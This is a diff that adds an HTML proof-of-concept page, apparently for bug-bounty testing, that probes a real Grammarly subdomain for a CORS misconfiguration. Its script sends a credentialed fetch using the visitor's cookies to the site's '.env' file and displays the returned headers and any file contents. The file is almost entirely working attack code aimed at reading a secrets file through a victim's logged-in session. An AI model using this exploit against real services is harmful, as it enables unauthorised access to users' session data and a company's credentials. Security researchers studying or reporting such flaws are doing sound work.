@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC - Grammarly Test</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        #output { background-color: #f4f4f4; padding: 20px; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <h1>CORS Exploit Test</h1>
+    <p>This page attempts to read data from <code>officeaddin.grammarly.com</code> using your logged-in session.</p>
+    <button onclick="runExploit()">Run Exploit Test</button>
+    <br><br>
+    <div id="output">Results will appear here...</div>
+
+    <script>
+        function runExploit() {
+            const outputDiv = document.getElementById('output');
+            outputDiv.textContent = 'Sending request...';
+
+            // The target URL - Let's try the root and a common sensitive file
+            const targetUrl = 'https://officeaddin.grammarly.com/.env';
+
+            fetch(targetUrl, {
+                method: 'GET',
+                credentials: 'include' // CRITICAL: Sends the user's cookies with the request
+            })
+            .then(response => {
+                // Log the response headers for the report
+                let resultText = `[+] HTTP Status: ${response.status} ${response.statusText}\n`;
+                resultText += `[+] Access-Control-Allow-Origin: ${response.headers.get('Access-Control-Allow-Origin')}\n`;
+                resultText += `[+] Access-Control-Allow-Credentials: ${response.headers.get('Access-Control-Allow-Credentials')}\n`;
+
+                if (response.ok) {
+                    // If the server responds OK, try to read the text
+                    return response.text().then(data => {
+                        resultText += `\n[+] RESPONSE BODY:\n${data}`;
+                        outputDiv.textContent = resultText;
+                    });
+                } else {
+                    // If the server responds with an error (403, 404, etc.)
+                    resultText += `\n[-] Server responded with an error. The CORS policy might still be vulnerable, but the file was not found.`;
+                    outputDiv.textContent = resultText;
+                    // Even if the file isn't found, the CORS headers are the key finding.
+                }
+            })
+            .catch(error => {
+                // This is where CORS errors will appear
+                outputDiv.textContent = `[-] FETCH FAILED. This is likely due to a CORS error (the browser blocked it).\n\nError: ${error}`;
+            });
+        }
+    </script>
+</body>
+</html>
